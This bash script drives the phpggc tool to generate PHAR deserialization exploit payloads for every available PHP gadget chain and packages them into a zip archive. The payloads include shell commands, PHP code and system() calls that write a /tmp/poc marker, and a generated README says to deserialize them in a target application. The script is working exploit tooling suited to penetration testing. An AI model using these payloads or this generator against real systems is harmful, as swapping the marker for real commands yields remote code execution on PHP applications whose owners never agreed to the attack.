#!/bin/bash

# PHAR Gadget Generator for phpggc
# This script generates all possible PHAR gadgets and compresses them

set -e

PHPGGC_PATH="./phpggc"
OUTPUT_DIR="phar_gadgets_$(date +%Y%m%d_%H%M%S)"
ZIP_FILE="${OUTPUT_DIR}.zip"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[+] PHAR Gadget Generator${NC}"
echo -e "${GREEN}[+] Output directory: ${OUTPUT_DIR}${NC}"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Get list of gadgets
echo -e "${YELLOW}[*] Fetching gadget list...${NC}"
GADGETS=$($PHPGGC_PATH -l | grep -E "^\w+/\w+" | awk '{print $1}')

if [ -z "$GADGETS" ]; then
    echo -e "${RED}[-] No gadgets found. Make sure phpggc is in the current directory.${NC}"
    exit 1
fi

TOTAL=$(echo "$GADGETS" | wc -l)
CURRENT=0
SUCCESS=0
FAILED=0

echo -e "${GREEN}[+] Found $TOTAL gadget chains${NC}"
echo ""

# Function to test PHAR creation
test_phar_creation() {
    local gadget=$1
    local payload=$2
    local output_file=$3
    local description=$4
    
    # Try to create the PHAR
    if timeout 10 $PHPGGC_PATH "$gadget" $payload -p phar -o "$output_file" 2>/dev/null; then
        # Verify the file was created
        if [ -f "$output_file" ]; then
            echo -e "${GREEN}  [✓] $description${NC}"
            return 0
        fi
    fi
    
    # Clean up failed attempt
    [ -f "$output_file" ] && rm -f "$output_file"
    return 1
}

# Process each gadget
for GADGET in $GADGETS; do
    CURRENT=$((CURRENT + 1))
    SAFE_NAME=$(echo "$GADGET" | tr '/' '_')
    
    echo -e "${YELLOW}[$CURRENT/$TOTAL] Processing: $GADGET${NC}"
    
    # Get gadget type
    TYPE=$($PHPGGC_PATH -l | grep "^$GADGET " | awk '{for(i=3;i<=NF;i++) if ($i ~ /RCE|File|SQL|SSRF/) {print $i; break}}')
    
    GADGET_SUCCESS=0
    
    # Try RCE (Command) - creates /tmp/poc file
    if echo "$TYPE" | grep -q "Command"; then
        OUTPUT="${OUTPUT_DIR}/${SAFE_NAME}_cmd.phar"
        if test_phar_creation "$GADGET" "touch /tmp/poc" "$OUTPUT" "RCE Command"; then
            GADGET_SUCCESS=1
        fi
    fi
    
    # Try RCE (PHP code) - creates /tmp/poc file
    if echo "$TYPE" | grep -q "RCE"; then
        OUTPUT="${OUTPUT_DIR}/${SAFE_NAME}_phpcode.phar"
        if test_phar_creation "$GADGET" 'file_put_contents("/tmp/poc","pwned");' "$OUTPUT" "RCE PHP Code"; then
            GADGET_SUCCESS=1
        fi
    fi
    
    # Try RCE (Function call) - creates /tmp/poc file
    if echo "$TYPE" | grep -q "Function"; then
        OUTPUT="${OUTPUT_DIR}/${SAFE_NAME}_func.phar"
        if test_phar_creation "$GADGET" "system 'touch /tmp/poc'" "$OUTPUT" "RCE Function Call"; then
            GADGET_SUCCESS=1
        fi
    fi
    
    # Try File Write/Delete operations
    if echo "$TYPE" | grep -q "File"; then
        OUTPUT="${OUTPUT_DIR}/${SAFE_NAME}_file.phar"
        if test_phar_creation "$GADGET" '"/tmp/poc"' "$OUTPUT" "File Operation"; then
            GADGET_SUCCESS=1
        fi
    fi
    
    # Generic fallback - try with basic touch command
    if [ $GADGET_SUCCESS -eq 0 ]; then
        OUTPUT="${OUTPUT_DIR}/${SAFE_NAME}_generic.phar"
        if test_phar_creation "$GADGET" '"touch /tmp/poc"' "$OUTPUT" "Generic Payload"; then
            GADGET_SUCCESS=1
        fi
    fi
    
    if [ $GADGET_SUCCESS -eq 1 ]; then
        SUCCESS=$((SUCCESS + 1))
        echo -e "${GREEN}  [✓] Successfully created PHAR(s)${NC}"
    else
        FAILED=$((FAILED + 1))
        echo -e "${RED}  [✗] Failed to create any PHAR${NC}"
    fi
    
    echo ""
done

# Create metadata file
cat > "$OUTPUT_DIR/README.txt" << EOF
PHAR Gadget Collection
Generated: $(date)
Total Gadgets Attempted: $TOTAL
Successful: $SUCCESS
Failed: $FAILED

All payloads are designed to create /tmp/poc file as an indicator.

Test these files by deserializing them in your target PHP application.
EOF

# Compress to ZIP
echo -e "${YELLOW}[*] Compressing PHARs to ZIP file...${NC}"
cd "$OUTPUT_DIR" && zip -q -r "../$ZIP_FILE" . && cd ..

# Summary
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}[+] Generation Complete!${NC}"
echo -e "${GREEN}================================${NC}"
echo -e "Total Gadgets: $TOTAL"
echo -e "${GREEN}Successful: $SUCCESS${NC}"
echo -e "${RED}Failed: $FAILED${NC}"
echo -e "Output Directory: $OUTPUT_DIR"
echo -e "ZIP File: $ZIP_FILE"
echo -e "${GREEN}================================${NC}"
